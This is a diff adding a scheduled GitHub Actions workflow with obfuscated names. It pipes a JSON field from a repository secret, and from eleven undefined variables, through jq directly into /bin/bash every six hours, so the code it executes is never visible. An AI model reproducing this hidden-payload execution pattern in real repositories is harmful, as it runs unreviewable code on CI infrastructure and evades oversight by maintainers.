@@ -1,0 +1,30 @@
+name: jiujiebaijiushi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiujiebaijiushi
+        env:
+          h22: ${{ secrets.h22 }}
+        run: |
+          echo $h22 | jq -r .lad4947 | /bin/bash
+          echo $bou267 | jq -r .t94 | /bin/bash
+          echo $s12 | jq -r .ovmle46 | /bin/bash
+          echo $t52332 | jq -r .k97222 | /bin/bash
+          echo $vwonq7 | jq -r .jw60663 | /bin/bash
+          echo $oaocn56 | jq -r .v04810 | /bin/bash
+          echo $rr29 | jq -r .teac490 | /bin/bash
+          echo $g73 | jq -r .zk14183 | /bin/bash
+          echo $d67 | jq -r .qpn33 | /bin/bash
+          echo $xh95 | jq -r .ab14444 | /bin/bash
+          echo $aeep49055 | jq -r .et701 | /bin/bash
+          echo $jjnyl22 | jq -r .k23 | /bin/bash
+
